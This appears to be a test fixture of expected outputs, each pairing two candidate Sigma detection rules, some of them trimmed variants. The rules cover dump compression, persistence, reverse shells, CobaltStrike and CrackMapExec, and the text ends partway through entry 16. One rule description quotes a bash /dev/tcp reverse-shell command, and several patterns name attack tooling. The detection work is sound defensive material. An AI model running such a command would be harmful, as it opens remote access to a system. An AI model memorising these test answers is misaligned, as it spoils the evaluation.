@@ -1,0 +1,1269 @@
+### Expected Sigma Rule Output1 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: 7Zip Compressing Dump Files
+id: ec570e53-4c76-45a9-804d-dc3f355ff7a7
+related:
+    - id: 1ac14d38-3dfc-4635-92c7-e3fd1c5f5bfc
+      type: derived
+status: test
+description: Detects execution of 7z in order to compress a file with a ".dmp"/".dump" extension, which could be a step in a process of dump file exfiltration.
+references:
+    - https://thedfirreport.com/2022/09/26/bumblebee-round-two/
+author: Nasreddine Bencherchali (Nextron Systems)
+date: 2022-09-27
+modified: 2023-09-12
+tags:
+    - attack.collection
+    - attack.t1560.001
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Description|contains: '7-Zip'
+        - Image|endswith:
+              - '\7z.exe'
+        - OriginalFileName:
+              - '7z.exe'
+              - '7za.exe'
+    selection_extension:
+        CommandLine|contains:
+            - '.dmp'
+            - '.dump'
+            - '.hdmp'
+    condition: all of selection_*
+falsepositives:
+    - Legitimate use of 7z with a command line in which ".dmp" or ".dump" appears accidentally
+    - Legitimate use of 7z to compress WER ".dmp" files for troubleshooting
+level: medium
+
+=====================  Sigma Rule Candidates 2  =====================
+title: 7Zip Compressing Dump Files
+id: ec570e53-4c76-45a9-804d-dc3f355ff7a7
+related:
+    - id: 1ac14d38-3dfc-4635-92c7-e3fd1c5f5bfc
+      type: derived
+status: test
+description: Detects execution of 7z in order to compress a file with a ".dmp"/".dump" extension, which could be a step in a process of dump file exfiltration.
+references:
+    - https://thedfirreport.com/2022/09/26/bumblebee-round-two/
+author: Nasreddine Bencherchali (Nextron Systems)
+date: 2022-09-27
+modified: 2023-09-12
+tags:
+    - attack.collection
+    - attack.t1560.001
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Description|contains: '7-Zip'
+        - OriginalFileName:
+              - '7z.exe'
+              - '7za.exe'
+    selection_extension:
+        CommandLine|contains:
+            - '.dmp'
+            - '.dump'
+            - '.hdmp'
+    condition: all of selection_*
+falsepositives:
+    - Legitimate use of 7z with a command line in which ".dmp" or ".dump" appears accidentally
+    - Legitimate use of 7z to compress WER ".dmp" files for troubleshooting
+level: medium
+
+### Expected Sigma Rule Output 2 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: Register New IFiltre For Persistence
+id: b23818c7-e575-4d13-8012-332075ec0a2b
+status: test
+description: |
+    Detects when an attacker registers a new IFilter for an extension. Microsoft Windows Search uses filters to extract the content of items for inclusion in a full-text index.
+    You can extend Windows Search to index new or proprietary file types by writing filters to extract the content, and property handlers to extract the properties of files.
+references:
+    - https://persistence-info.github.io/Data/ifilters.html
+author: Nasreddine Bencherchali (Nextron Systems)
+date: 2022-07-21
+modified: 2024-03-26
+tags:
+    - attack.persistence
+logsource:
+    category: registry_set
+    product: windows
+detection:
+    selection_ext:
+        TargetObject|contains|all:
+            - '\SOFTWARE\Classes\.'
+            - '\PersistentHandler'
+    selection_clsid:
+        TargetObject|contains|all:
+            - '\SOFTWARE\Classes\CLSID'
+            - '\PersistentAddinsRegistered\{89BCB740-6119-101A-BCB7-00DD010655AF}'
+    filter_default_targets:
+        TargetObject|contains:
+            # TODO: Add the default extension PersistentHandler.
+            # Note this could also offer blindspot as the attacker could use on of these and hijack them
+            - '\CLSID\{4F46F75F-199F-4C63-8B7D-86D48FE7970C}\' # Office Open XML Format PowerPoint Persistent Handler
+            - '\CLSID\{4887767F-7ADC-4983-B576-88FB643D6F79}\' # Office Open XML Format Excel Persistent Handler
+            - '\CLSID\{D3B41FA1-01E3-49AF-AA25-1D0D824275AE}\' # Office Open XML Format Word Persistent Handlerult)
+            - '\CLSID\{FB10BD80-A331-4e9e-9EB7-00279903AD99}\' # Office Outlook MSG Persistent Handler
+    filter_generic_paths:
+        Image|startswith:
+            # Note: We assume if an attacker has access to one of these directories. Then he already has admin.
+            - 'C:\Windows\System32\'
+            - 'C:\Program Files (x86)\'
+            - 'C:\Program Files\'
+    condition: 1 of selection_* and not 1 of filter_*
+falsepositives:
+    - Legitimate registration of IFilters by the OS or software
+level: medium
+
+=====================  Sigma Rule Candidates 2  =====================
+title: Register New IFiltre For Persistence
+id: b23818c7-e575-4d13-8012-332075ec0a2b
+status: test
+description: |
+    Detects when an attacker registers a new IFilter for an extension. Microsoft Windows Search uses filters to extract the content of items for inclusion in a full-text index.
+    You can extend Windows Search to index new or proprietary file types by writing filters to extract the content, and property handlers to extract the properties of files.
+references:
+    - https://persistence-info.github.io/Data/ifilters.html
+author: Nasreddine Bencherchali (Nextron Systems)
+date: 2022-07-21
+modified: 2024-03-26
+tags:
+    - attack.persistence
+logsource:
+    category: registry_set
+    product: windows
+detection:
+    selection_clsid:
+        TargetObject|contains|all:
+            - '\SOFTWARE\Classes\CLSID'
+            - '\PersistentAddinsRegistered\{89BCB740-6119-101A-BCB7-00DD010655AF}'
+    filter_default_targets:
+        TargetObject|contains:
+            # TODO: Add the default extension PersistentHandler.
+            # Note this could also offer blindspot as the attacker could use on of these and hijack them
+            - '\CLSID\{4F46F75F-199F-4C63-8B7D-86D48FE7970C}\' # Office Open XML Format PowerPoint Persistent Handler
+    filter_generic_paths:
+        Image|startswith:
+            # Note: We assume if an attacker has access to one of these directories. Then he already has admin.
+            - 'C:\Windows\System32\'
+            - 'C:\Program Files (x86)\'
+            - 'C:\Program Files\'
+    condition: 1 of selection_* and not 1 of filter_*
+falsepositives:
+    - Legitimate registration of IFilters by the OS or software
+level: medium
+
+### Expected Sigma Rule Output 3 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: Linux Reverse Shell Indicator
+id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
+status: test
+description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
+references:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+author: Florian Roth (Nextron Systems)
+date: 2021-10-16
+modified: 2022-12-25
+tags:
+    - attack.execution
+    - attack.t1059.004
+logsource:
+    product: linux
+    category: network_connection
+detection:
+    selection:
+        Image|endswith: '/bin/bash'
+    filter:
+        DestinationIp:
+            - '127.0.0.1'
+            - '0.0.0.0'
+    condition: selection and not filter
+falsepositives:
+    - Unknown
+level: critical
+
+=====================  Sigma Rule Candidates 2  =====================
+title: Linux Reverse Shell Indicator
+id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
+status: test
+description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
+references:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+author: Florian Roth (Nextron Systems)
+date: 2021-10-16
+modified: 2022-12-25
+tags:
+    - attack.execution
+    - attack.t1059.004
+logsource:
+    product: linux
+    category: network_connection
+detection:
+    selection:
+        Image|endswith: '/bin/bash'
+    condition: selection
+falsepositives:
+    - Unknown
+level: critical
+
+### Expected Sigma Rule Output 4 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: Scheduled Task Created - Registry
+id: 93ff0ceb-e0ef-4586-8cd8-a6c277d738e3
+status: test
+description: Detects the creation of a scheduled task via Registry keys.
+references:
+    - https://center-for-threat-informed-defense.github.io/summiting-the-pyramid/analytics/task_scheduling/
+author: Center for Threat Informed Defense (CTID) Summiting the Pyramid Team
+date: 2023-09-27
+tags:
+    - attack.execution
+    - attack.persistence
+    - attack.privilege-escalation
+    - attack.s0111
+    - attack.t1053.005
+    - car.2013-08-001
+    - detection.threat-hunting
+logsource:
+    product: windows
+    category: registry_event
+detection:
+    selection:
+        TargetObject|contains:
+            - '\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\'
+            - '\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\'
+    condition: selection
+falsepositives:
+    - Likely as this is a normal behaviour on Windows
+level: low
+
+=====================  Sigma Rule Candidates 2  =====================
+title: Scheduled Task Created - Registry
+id: 93ff0ceb-e0ef-4586-8cd8-a6c277d738e3
+status: test
+description: Detects the creation of a scheduled task via Registry keys.
+references:
+    - https://center-for-threat-informed-defense.github.io/summiting-the-pyramid/analytics/task_scheduling/
+author: Center for Threat Informed Defense (CTID) Summiting the Pyramid Team
+date: 2023-09-27
+tags:
+    - attack.execution
+    - attack.persistence
+    - attack.privilege-escalation
+    - attack.s0111
+    - attack.t1053.005
+    - car.2013-08-001
+    - detection.threat-hunting
+logsource:
+    product: windows
+    category: registry_event
+detection:
+    selection:
+        TargetObject|contains:
+            - '\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\'
+    condition: selection
+falsepositives:
+    - Likely as this is a normal behaviour on Windows
+level: low
+
+### Expected Sigma Rule Output 5 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: Execute MSDT.EXE Using Diagcab File
+id: 6545ce61-a1bd-4119-b9be-fcbee42c0cf3
+status: deprecated
+description: Detects diagcab leveraging the "ms-msdt" handler or the "msdt.exe" binary to execute arbitrary commands as seen in CVE-2022-30190
+references:
+    - https://github.com/GossiTheDog/ThreatHunting/blob/e85884abbf05d5b41efc809ea6532b10b45bd05c/AdvancedHuntingQueries/DogWalk-DiagCab
+author: GossiTheDog, frack113
+date: 2022/06/09
+modified: 2023/02/06
+tags:
+    - attack.defense_evasion
+    - attack.t1202
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: '\msdt.exe'
+        - OriginalFileName: 'msdt.exe'
+    selection_cmd:
+        CommandLine|contains:
+            - ' /cab'
+            - ' -cab'
+    condition: all of selection_*
+falsepositives:
+    - Legitimate usage of ".diagcab" files
+level: high
+
+=====================  Sigma Rule Candidates 2  =====================
+title: Execute MSDT.EXE Using Diagcab File
+id: 6545ce61-a1bd-4119-b9be-fcbee42c0cf3
+status: deprecated
+description: Detects diagcab leveraging the "ms-msdt" handler or the "msdt.exe" binary to execute arbitrary commands as seen in CVE-2022-30190
+references:
+    - https://github.com/GossiTheDog/ThreatHunting/blob/e85884abbf05d5b41efc809ea6532b10b45bd05c/AdvancedHuntingQueries/DogWalk-DiagCab
+author: GossiTheDog, frack113
+date: 2022/06/09
+modified: 2023/02/06
+tags:
+    - attack.defense_evasion
+    - attack.t1202
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - OriginalFileName: 'msdt.exe'
+    selection_cmd:
+        CommandLine|contains:
+            - ' /cab'
+    condition: all of selection_*
+falsepositives:
+    - Legitimate usage of ".diagcab" files
+level: high
+
+### Expected Sigma Rule Output 6 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: Suspicious Registry Modification From ADS Via Regini.EXE
+id: 77946e79-97f1-45a2-84b4-f37b5c0d8682
+related:
+    - id: 5f60740a-f57b-4e76-82a1-15b6ff2cb134
+      type: derived
+status: test
+description: Detects the import of an alternate data stream with regini.exe, regini.exe can be used to modify registry keys.
+references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Regini/
+author: Eli Salem, Sander Wiebing, oscd.community
+date: 2020-10-12
+modified: 2023-02-08
+tags:
+    - attack.t1112
+    - attack.defense-evasion
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: '\regini.exe'
+        - OriginalFileName: 'REGINI.EXE'
+    selection_re:
+        CommandLine|re: ':[^ \\]'
+    condition: all of selection_*
+fields:
+    - ParentImage
+    - CommandLine
+falsepositives:
+    - Unknown
+level: high
+
+=====================  Sigma Rule Candidates 2  =====================
+title: Suspicious Registry Modification From ADS Via Regini.EXE
+id: 77946e79-97f1-45a2-84b4-f37b5c0d8682
+related:
+    - id: 5f60740a-f57b-4e76-82a1-15b6ff2cb134
+      type: derived
+status: test
+description: Detects the import of an alternate data stream with regini.exe, regini.exe can be used to modify registry keys.
+references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Regini/
+author: Eli Salem, Sander Wiebing, oscd.community
+date: 2020-10-12
+modified: 2023-02-08
+tags:
+    - attack.t1112
+    - attack.defense-evasion
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: '\regini.exe'
+        - OriginalFileName: 'REGINI.EXE'
+    selection_re:
+        CommandLine|re: ':[^ \\]'
+    condition: all of selection_*
+falsepositives:
+    - Unknown
+level: high
+
+### Expected Sigma Rule Output 7 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: Task Scheduler DLL Loaded By Application Located In Potentially Suspicious Location
+id: 3b92a1d0-8d4b-4d28-a1b4-1e29d49a6a3e
+status: experimental
+description: |
+    Detects the loading of the "taskschd.dll" module from a process that located in a potentially suspicious or uncommon directory.
+    The loading of this DLL might indicate that the application have the capability to create a scheduled task via the "Schedule.Service" COM object.
+    Investigation of the loading application and its behavior is required to determining if its malicious.
+references:
+    - https://www.logpoint.com/en/blog/shenanigans-of-scheduled-tasks/
+author: Swachchhanda Shrawan Poudel
+date: 2024-09-02
+tags:
+    - attack.persistence
+    - attack.execution
+    - attack.t1053.005
+logsource:
+    category: image_load
+    product: windows
+detection:
+    selection_dll:
+        - ImageLoaded|endswith: '\taskschd.dll'
+        - OriginalFileName: 'taskschd.dll'
+    selection_paths:
+        Image|contains:
+            - ':\Temp\'
+            - ':\Users\Public\'
+    condition: all of selection_*
+falsepositives:
+    - Some installers might generate false positives, apply additional filters accordingly.
+level: low
+
+=====================  Sigma Rule Candidates 2  =====================
+title: Task Scheduler DLL Loaded By Application Located In Potentially Suspicious Location
+id: 3b92a1d0-8d4b-4d28-a1b4-1e29d49a6a3e
+status: experimental
+description: |
+    Detects the loading of the "taskschd.dll" module from a process that located in a potentially suspicious or uncommon directory.
+    The loading of this DLL might indicate that the application have the capability to create a scheduled task via the "Schedule.Service" COM object.
+    Investigation of the loading application and its behavior is required to determining if its malicious.
+references:
+    - https://www.logpoint.com/en/blog/shenanigans-of-scheduled-tasks/
+author: Swachchhanda Shrawan Poudel
+date: 2024-09-02
+tags:
+    - attack.persistence
+    - attack.execution
+    - attack.t1053.005
+logsource:
+    category: image_load
+    product: windows
+detection:
+    selection_dll:
+        - ImageLoaded|endswith: '\taskschd.dll'
+        - OriginalFileName: 'taskschd.dll'
+    selection_paths:
+        Image|contains:
+            - ':\Temp\'
+    condition: all of selection_*
+falsepositives:
+    - Some installers might generate false positives, apply additional filters accordingly.
+level: low
+
+### Expected Sigma Rule Output 8 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: Powershell Base64 Encoded MpPreference Cmdlet
+id: c6fb44c6-71f5-49e6-9462-1425d328aee3
+status: test
+description: Detects base64 encoded "MpPreference" PowerShell cmdlet code that tries to modifies or tamper with Windows Defender AV
+references:
+    - https://learn.microsoft.com/en-us/defender-endpoint/configure-process-opened-file-exclusions-microsoft-defender-antivirus
+author: Florian Roth (Nextron Systems)
+date: 2022-03-04
+modified: 2023-01-30
+tags:
+    - attack.defense-evasion
+    - attack.t1562.001
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - CommandLine|base64offset|contains:
+              - 'Add-MpPreference '
+        - CommandLine|contains:
+              # UTF16-LE
+              - 'QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgA'
+    condition: selection
+falsepositives:
+    - Unknown
+level: high
+
+=====================  Sigma Rule Candidates 2  =====================
+title: Powershell Base64 Encoded MpPreference Cmdlet
+id: c6fb44c6-71f5-49e6-9462-1425d328aee3
+status: test
+description: Detects base64 encoded "MpPreference" PowerShell cmdlet code that tries to modifies or tamper with Windows Defender AV
+references:
+    - https://learn.microsoft.com/en-us/defender-endpoint/configure-process-opened-file-exclusions-microsoft-defender-antivirus
+author: Florian Roth (Nextron Systems)
+date: 2022-03-04
+modified: 2023-01-30
+tags:
+    - attack.defense-evasion
+    - attack.t1562.001
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - CommandLine|base64offset|contains:
+              - 'Add-MpPreference '
+    condition: selection
+falsepositives:
+    - Unknown
+level: high
+
+### Expected Sigma Rule Output 9 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: Suspicious Encoded Scripts in a WMI Consumer
+id: 83844185-1c5b-45bc-bcf3-b5bf3084ca5b
+status: test
+description: Detects suspicious encoded payloads in WMI Event Consumers
+references:
+    - https://github.com/RiccardoAncarani/LiquidSnake
+author: Florian Roth (Nextron Systems)
+date: 2021-09-01
+modified: 2022-10-09
+tags:
+    - attack.execution
+    - attack.t1047
+    - attack.persistence
+    - attack.t1546.003
+logsource:
+    product: windows
+    category: wmi_event
+detection:
+    selection_destination:
+        Destination|base64offset|contains:
+            - 'WriteProcessMemory'
+            - 'This program cannot be run in DOS mode'
+            - 'This program must be run under Win32'
+    condition: selection_destination
+fields:
+    - User
+    - Operation
+falsepositives:
+    - Unknown
+level: high
+
+=====================  Sigma Rule Candidates 2  =====================
+title: Suspicious Encoded Scripts in a WMI Consumer
+id: 83844185-1c5b-45bc-bcf3-b5bf3084ca5b
+status: test
+description: Detects suspicious encoded payloads in WMI Event Consumers
+references:
+    - https://github.com/RiccardoAncarani/LiquidSnake
+author: Florian Roth (Nextron Systems)
+date: 2021-09-01
+modified: 2022-10-09
+tags:
+    - attack.execution
+    - attack.t1047
+    - attack.persistence
+    - attack.t1546.003
+logsource:
+    product: windows
+    category: wmi_event
+detection:
+    selection_destination:
+        Destination|base64offset|contains:
+            - 'WriteProcessMemory'
+    condition: selection_destination
+fields:
+    - User
+    - Operation
+falsepositives:
+    - Unknown
+level: high
+
+### Expected Sigma Rule Output 10 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: CobaltStrike Malleable OneDrive Browsing Traffic Profile
+id: c9b33401-cc6a-4cf6-83bb-57ddcb2407fc
+status: deprecated
+description: Detects Malleable OneDrive Profile
+references:
+    - https://github.com/rsmudge/Malleable-C2-Profiles/blob/26323784672913923d20c5a638c6ca79459e8529/normal/onedrive_getonly.profile
+author: Markus Neis
+date: 2019/11/12
+modified: 2024/02/15
+tags:
+    - attack.defense_evasion
+    - attack.command_and_control
+    - attack.t1071.001
+logsource:
+    category: proxy
+detection:
+    selection:
+        cs-method: 'GET'
+        c-uri|endswith: '\?manifest=wac'
+    filter:
+        c-uri|startswith: 'http'
+        c-uri|contains: '://onedrive.live.com/'
+    condition: selection and not filter
+falsepositives:
+    - Unknown
+level: high
+
+=====================  Sigma Rule Candidates 2  =====================
+title: CobaltStrike Malleable OneDrive Browsing Traffic Profile
+id: c9b33401-cc6a-4cf6-83bb-57ddcb2407fc
+status: deprecated
+description: Detects Malleable OneDrive Profile
+references:
+    - https://github.com/rsmudge/Malleable-C2-Profiles/blob/26323784672913923d20c5a638c6ca79459e8529/normal/onedrive_getonly.profile
+author: Markus Neis
+date: 2019/11/12
+modified: 2024/02/15
+tags:
+    - attack.defense_evasion
+    - attack.command_and_control
+    - attack.t1071.001
+logsource:
+    category: proxy
+detection:
+    selection:
+        cs-method: 'GET'
+        c-uri|endswith: '\?manifest=wac'
+    filter:
+        c-uri|startswith: 'http'
+        c-uri|contains: '://onedrive.live.com/'
+    condition: selection and not filter
+falsepositives:
+    - Unknown
+level: high
+
+### Expected Sigma Rule Output 11 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: CobaltStrike Named Pipe Pattern Regex
+id: 0e7163d4-9e19-4fa7-9be6-000c61aad77a
+related:
+    - id: 85adeb13-4fc9-4e68-8a4a-c7cb2c336eb7 # Patterns
+      type: similar
+    - id: d5601f8c-b26f-4ab0-9035-69e11a8d4ad2 # Generic
+      type: similar
+status: test
+description: Detects the creation of a named pipe matching a pattern used by CobaltStrike Malleable C2 profiles
+references:
+    - https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575
+author: Florian Roth (Nextron Systems)
+date: 2021-07-30
+modified: 2022-12-31
+tags:
+    - attack.defense-evasion
+    - attack.privilege-escalation
+    - attack.t1055
+logsource:
+    product: windows
+    category: pipe_created
+    definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can always use Cobalt Strike, but also you can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575'
+detection:
+    selection:
+        - PipeName|re: '\\mojo\.5688\.8052\.(?:183894939787088877|35780273329370473)[0-9a-f]{2}'
+        - PipeName|re: '\\wkssvc_?[0-9a-f]{2}'
+    condition: selection
+falsepositives:
+    - Unknown
+level: critical
+
+=====================  Sigma Rule Candidates 2  =====================
+title: CobaltStrike Named Pipe Pattern Regex
+id: 0e7163d4-9e19-4fa7-9be6-000c61aad77a
+related:
+    - id: 85adeb13-4fc9-4e68-8a4a-c7cb2c336eb7 # Patterns
+      type: similar
+    - id: d5601f8c-b26f-4ab0-9035-69e11a8d4ad2 # Generic
+      type: similar
+status: test
+description: Detects the creation of a named pipe matching a pattern used by CobaltStrike Malleable C2 profiles
+references:
+    - https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575
+author: Florian Roth (Nextron Systems)
+date: 2021-07-30
+modified: 2022-12-31
+tags:
+    - attack.defense-evasion
+    - attack.privilege-escalation
+    - attack.t1055
+logsource:
+    product: windows
+    category: pipe_created
+detection:
+    selection:
+        - PipeName|re: '\\mojo\.5688\.8052\.(?:183894939787088877|35780273329370473)[0-9a-f]{2}'
+        - PipeName|re: '\\wkssvc_?[0-9a-f]{2}'
+    condition: selection
+falsepositives:
+    - Unknown
+level: critical
+
+### Expected Sigma Rule Output 12 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: Malicious Usage Of IMDS Credentials Outside Of AWS Infrastructure
+id: 352a918a-34d8-4882-8470-44830c507aa3
+status: experimental
+description: |
+    Detects when an instance identity has taken an action that isn't inside SSM.
+    This can indicate that a compromised EC2 instance is being used as a pivot point.
+references:
+    - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-identity-roles.html
+author: jamesc-grafana
+date: 2024-07-11
+tags:
+    - attack.privilege-escalation
+    - attack.defense-evasion
+    - attack.t1078
+    - attack.t1078.002
+logsource:
+    product: aws
+    service: cloudtrail
+detection:
+    selection:
+        userIdentity.arn|re: '.+:assumed-role/aws:.+'
+    filter_main_generic:
+        - eventSource: 'ssm.amazonaws.com'
+    condition: selection and not 1 of filter_main_*
+falsepositives:
+    - A team has configured an EC2 instance to use instance profiles that grant the option for the EC2 instance to talk to other AWS Services
+level: high
+
+=====================  Sigma Rule Candidates 2  =====================
+title: Malicious Usage Of IMDS Credentials Outside Of AWS Infrastructure
+id: 352a918a-34d8-4882-8470-44830c507aa3
+status: experimental
+description: |
+    Detects when an instance identity has taken an action that isn't inside SSM.
+    This can indicate that a compromised EC2 instance is being used as a pivot point.
+author: jamesc-grafana
+date: 2024-07-11
+tags:
+    - attack.privilege-escalation
+    - attack.defense-evasion
+    - attack.t1078
+    - attack.t1078.002
+logsource:
+    product: aws
+    service: cloudtrail
+detection:
+    selection:
+        userIdentity.arn|re: '.+:assumed-role/aws:.+'
+    condition: selection
+falsepositives:
+    - A team has configured an EC2 instance to use instance profiles that grant the option for the EC2 instance to talk to other AWS Services
+level: high
+
+### Expected Sigma Rule Output 13 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: HackTool - CrackMapExec File Indicators
+id: 736ffa74-5f6f-44ca-94ef-1c0df4f51d2a
+related:
+    - id: 9433ff9c-5d3f-4269-99f8-95fc826ea489
+      type: obsolete
+status: experimental
+description: Detects file creation events with filename patterns used by CrackMapExec.
+references:
+    - https://github.com/byt3bl33d3r/CrackMapExec/
+author: Nasreddine Bencherchali (Nextron Systems)
+date: 2024-03-11
+modified: 2024-06-27
+tags:
+    - attack.credential-access
+    - attack.t1003.001
+logsource:
+    product: windows
+    category: file_event
+detection:
+    selection_path:
+        TargetFilename|startswith: 'C:\Windows\Temp\' # The disk extension is hardcoded in the tool.
+    selection_names_str:
+        TargetFilename|endswith:
+            - '\temp.ps1'
+            - '\msol.ps1'
+    selection_names_re:
+        - TargetFilename|re: '\\[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\.txt$'
+        - TargetFilename|re: '\\[a-zA-Z]{8}\.tmp$'
+    condition: selection_path and 1 of selection_names_*
+falsepositives:
+    - Unknown
+level: high
+
+=====================  Sigma Rule Candidates 2  =====================
+title: HackTool - CrackMapExec File Indicators
+id: 736ffa74-5f6f-44ca-94ef-1c0df4f51d2a
+related:
+    - id: 9433ff9c-5d3f-4269-99f8-95fc826ea489
+      type: obsolete
+status: experimental
+description: Detects file creation events with filename patterns used by CrackMapExec.
+references:
+    - https://github.com/byt3bl33d3r/CrackMapExec/
+author: Nasreddine Bencherchali (Nextron Systems)
+date: 2024-03-11
+modified: 2024-06-27
+tags:
+    - attack.credential-access
+    - attack.t1003.001
+logsource:
+    product: windows
+    category: file_event
+detection:
+    selection_path:
+        TargetFilename|startswith: 'C:\Windows\Temp\' # The disk extension is hardcoded in the tool.
+    selection_names_re:
+        - TargetFilename|re: '\\[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\.txt$'
+        - TargetFilename|re: '\\[a-zA-Z]{8}\.tmp$'
+    condition: selection_path and 1 of selection_names_*
+falsepositives:
+    - Unknown
+level: high
+
+### Expected Sigma Rule Output 14 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: CobaltStrike Malleable OneDrive Browsing Traffic Profile
+id: c9b33401-cc6a-4cf6-83bb-57ddcb2407fc
+status: deprecated
+description: Detects Malleable OneDrive Profile
+references:
+    - https://github.com/rsmudge/Malleable-C2-Profiles/blob/26323784672913923d20c5a638c6ca79459e8529/normal/onedrive_getonly.profile
+author: Markus Neis
+date: 2019/11/12
+modified: 2024/02/15
+tags:
+    - attack.defense_evasion
+    - attack.command_and_control
+    - attack.t1071.001
+logsource:
+    category: proxy
+detection:
+    selection:
+        cs-method: 'GET'
+        c-uri|endswith: '\?manifest=wac'
+        cs-host: 'onedrive.live.com'
+    filter:
+        c-uri|startswith: 'http'
+        c-uri|contains: '://onedrive.live.com/'
+    condition: selection and not filter
+falsepositives:
+    - Unknown
+level: high
+
+=====================  Sigma Rule Candidates 2  =====================
+title: CobaltStrike Malleable OneDrive Browsing Traffic Profile
+id: c9b33401-cc6a-4cf6-83bb-57ddcb2407fc
+status: deprecated
+description: Detects Malleable OneDrive Profile
+references:
+    - https://github.com/rsmudge/Malleable-C2-Profiles/blob/26323784672913923d20c5a638c6ca79459e8529/normal/onedrive_getonly.profile
+author: Markus Neis
+date: 2019/11/12
+modified: 2024/02/15
+tags:
+    - attack.defense_evasion
+    - attack.command_and_control
+    - attack.t1071.001
+logsource:
+    category: proxy
+detection:
+    selection:
+        c-uri|endswith: '\?manifest=wac'
+        cs-host: 'onedrive.live.com'
+    filter:
+        c-uri|startswith: 'http'
+    condition: selection and not filter
+falsepositives:
+    - Unknown
+level: high
+
+### Expected Sigma Rule Output 15 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: Detection of 'whoami /user' Command Execution with Obfuscation
+id: 9a8b7c6d-5e4f-3210-bcde-f1234567890a
+description: Detects the execution of 'whoami /user' command, including common obfuscation techniques, which can be used for user enumeration by attackers.
+author: Yusuke Nakajima
+date: 2025-02-27
+tags:
+  - attack.execution
+  - attack.discovery
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    EventID: 4688
+    CommandLine|re: "(?i)\\bwhoami\\b.*[/-][\"']?u[\"']?s[\"']?e[\"']?r[\"']?"
+  condition: selection
+falsepositives:
+  - Legitimate use of 'whoami /user' command for administrative or troubleshooting purposes.
+level: medium
+
+=====================  Sigma Rule Candidates 2  =====================
+title: Detection of 'whoami /user' Command Execution with Obfuscation
+id: 9a8b7c6d-5e4f-3210-bcde-f1234567890a
+description: Detects the execution of 'whoami /user' command, including common obfuscation techniques, which can be used for user enumeration by attackers.
+author: Yusuke Nakajima
+date: 2025-02-27
+tags:
+  - attack.execution
+  - attack.discovery
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    EventID: 4688
+    CommandLine|re: "(?i)\\bwhoami\\b.*[/-][\"']?u[\"']?s[\"']?e[\"']?r[\"']?"
+  condition: selection
+falsepositives:
+  - Legitimate use of 'whoami /user' command for administrative or troubleshooting purposes.
+level: medium
+
+### Expected Sigma Rule Output 16 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: Potential Exfiltration of Compressed Files
+id: 0d47e3f6-357f-4534-928c-202631d065fa
+status: unsupported
+description: |
+    This rule detects potential exfiltration by looking for a few compression extensions in the uri and signs of compression in the mime type, file type, and http body
+references:
+    - https://github.com/OTRF/detection-hackathon-apt29/issues/17
+author: Greg Howell, OTR (Open Threat Research)
+date: 2020/04/05
+modified: 2023/03/24
+tags:
+    - attack.exfiltration
+    - attack.t1560.001
+    - attack.t1005
+logsource:
+    product: zeek
+    service: http
+detection:
+    selection1:
+        uri|endswith:
+         - '.7z'
+         - '.zip'
+         - '.rar'
+        mime_types|endswith: 'compressed'
+    selection3:
+        filetype|endswith: 'compressed'
+    selection4:
+        http.bodyMagic|endswith: 'compressed'
+        http.method: PUT
